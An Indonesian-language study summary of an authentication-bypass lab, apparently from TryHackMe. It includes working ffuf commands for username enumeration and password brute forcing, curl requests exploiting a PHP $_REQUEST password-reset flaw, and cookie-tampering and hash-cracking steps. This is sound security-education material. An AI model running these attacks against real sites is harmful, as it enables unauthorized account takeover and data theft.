```
=== Authentication Bypass - Resume Materi ===
[08 Mar 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU AUTHENTICATION BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Teknik melewati, mengalahkan, atau membobol sistem autentikasi
Dampak   : Salah satu kerentanan PALING KRITIS karena berujung kebocoran
           data pribadi pelanggan
3 Kondisi: Bypassed  = autentikasi dilewati total tanpa proses normal
           Defeated   = autentikasi diikuti tapi berhasil dibobol
           Broken     = autentikasi cacat karena desain/implementasi buruk

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 USERNAME ENUMERATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Teknik membuat daftar username valid dari pesan error website
Cara     : Kirim username ke form signup → kalau muncul error
           "An account with this username already exists" → username VALID
Tool     : ffuf (fuzzing tool) dengan wordlist nama dari SecLists
Wordlist : /usr/share/wordlists/SecLists/Usernames/Names/names.txt
Output   : Simpan hasil ke valid_usernames.txt untuk dipakai di brute force

Command :
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt
     -X POST
     -d "username=FUZZ&email=x&password=x&cpassword=x"
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://TARGET/customers/signup
     -mr "username already exists"
     -of csv -o valid_usernames.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 BRUTE FORCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Proses otomatis mencoba daftar password umum terhadap
           satu atau banyak username sekaligus
Wordlist : /usr/share/wordlists/SecLists/Passwords/Common-Credentials/
           10-million-password-list-top-100.txt
Penting  : Pastikan terminal berada di direktori yang sama dengan
           valid_usernames.txt sebelum jalankan command
Hasil    : Menemukan SATU kombinasi username & password yang berhasil login

Command :
ffuf -w valid_usernames.txt:W1,
        /usr/share/.../10-million-password-list-top-100.txt:W2
     -X POST
     -d "username=W1&password=W2"
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://TARGET/customers/login
     -fc 200

Beda dengan Enumeration :
  Enumeration  → 1 wordlist → pakai keyword FUZZ
  Brute Force  → 2 wordlist → pakai keyword W1 & W2 (custom label)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SWITCH FFUF & FUNGSINYA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-w      → Wordlist yang dipakai, bisa lebih dari satu dipisah koma
          Format multi wordlist : -w file1.txt:W1,file2.txt:W2
-X      → Metode HTTP (GET default, POST untuk form login/signup)
-d      → Data yang dikirim via POST (isi form)
-H      → Tambah header ke request
          Contoh : "Content-Type: application/x-www-form-urlencoded"
-u      → URL target
-mr     → Match Response — cari teks ini di halaman, kalau ada = VALID
-fc     → Filter Code — abaikan response dengan status code ini
          Contoh : -fc 200 = tampilkan HANYA yang bukan 200 (login berhasil)
-of     → Output format (csv, json, dll)
-o      → Simpan output ke file
FUZZ    → Keyword penanda posisi di mana isi wordlist dimasukkan (1 wordlist)
W1/W2   → Custom keyword untuk multi wordlist

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SWITCH CURL & FUNGSINYA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-H      → Tambah header ke request
          Contoh : "Content-Type: application/x-www-form-urlencoded"
                   "Cookie: logged_in=true; admin=true"
-d      → Data yang dikirim via POST
          Contoh : "username=robert&email=attacker@hacker.com"
%40     → Encoding URL dari karakter @ dalam URL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LOGIC FLAW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Celah ketika alur logika normal aplikasi bisa dilewati/dimanipulasi
Contoh   : Kode PHP cek URL dengan === (case sensitive)
           → /admin  = dicek → /adMin = LOLOS tanpa cek → bypass total

Kasus Reset Password :
  Normal   : email via URL (GET) → username via POST → reset email ke pemilik
  Celah    : Sistem pakai $_REQUEST untuk kirim email reset
  $_REQUEST: Array PHP yang gabungkan GET + POST, tapi PRIORITASKAN POST
  Exploit  : Tambahkan email=milikku di bagian POST (-d)
             → sistem kirim reset email ke kita, bukan ke korban

Curl Request 1 (normal) :
curl 'http://TARGET/customers/reset?email=robert%40acmeitsupport.thm'
     -H 'Content-Type: application/x-www-form-urlencoded'
     -d 'username=robert'

Curl Request 2 (exploit) :
curl 'http://TARGET/customers/reset?email=robert%40acmeitsupport.thm'
     -H 'Content-Type: application/x-www-form-urlencoded'
     -d 'username=robert&email=AKUNMU@customer.acmeitsupport.thm'

Alur Exploit :
1. Daftar akun → dapat email {username}@customer.acmeitsupport.thm
2. Jalankan Curl Request 2 pakai email akunmu sendiri
3. Cek Support Tickets → ada link login otomatis sebagai korban
4. Akses akun korban → ambil flag

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 COOKIE TAMPERING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Memodifikasi cookie untuk mendapat akses tidak sah,
           akses akun lain, atau privilege lebih tinggi

[ PLAIN TEXT ]
Contoh cookie rentan :
  Set-Cookie: logged_in=true; Max-Age=3600; Path=/
  Set-Cookie: admin=false; Max-Age=3600; Path=/
Exploit  : Ubah admin=false → admin=true → kirim lewat header -H di curl
Hasil    : Logged In As An Admin + flag

[ HASHING ]
Definisi : Representasi teks yang tidak bisa dibalik (irreversible)
Sifat    : Input sama → output SELALU sama
Metode   : md5, sha1, sha-256, sha-512
Cara crack: https://crackstation.net — database miliaran hash + aslinya
Contoh hash angka 1 :
  md5    → c4ca4238a0b923820dcc509a6f75849b
  sha1   → 356a192b7913b04c54574d18c28d46e6395428ab
  sha256 → 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b

[ ENCODING ]
Definisi : Mirip hashing tapi BISA DIBALIK (reversible)
Tujuan   : Konversi binary → teks agar aman dikirim via ASCII
Jenis    : base32 → karakter A-Z dan 2-7
           base64 → karakter a-z, A-Z, 0-9, +, / dan = untuk padding
Exploit  : Decode cookie base64 → ubah nilai → encode ulang → kirim
Contoh   :
  Cookie  : session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
  Decoded : {"id":1,"admin": false}
  Ubah    : {"id":1,"admin": true}
  Encode  : kirim sebagai cookie baru → dapat akses admin

Beda Hashing vs Encoding :
  Hashing  = TIDAK bisa dibalik, untuk verifikasi
  Encoding = BISA dibalik, untuk transmisi data

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING YANG WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Authentication   = Verifikasi identitas sebelum akses ke sistem
Cookie           = Data kecil yang disimpan browser, dikirim ke server
                   setiap request untuk pertahankan sesi
$_REQUEST        = Variabel PHP yang gabungkan data GET + POST,
                   prioritaskan POST jika key sama
Fuzzing          = Teknik otomatis kirim banyak input untuk cari celah
Wordlist         = File berisi daftar kata untuk dipakai dalam serangan
Hash             = Output irreversible dari fungsi hashing
Encoding         = Konversi data yang bisa dibalik (base64, base32)
Plain Text Cookie= Cookie yang isinya langsung terbaca tanpa enkripsi
Logic Flaw       = Celah karena kesalahan logika programmer, bukan bug teknis
Information      = Kebocoran info teknologi server lewat response headers
Disclosure
```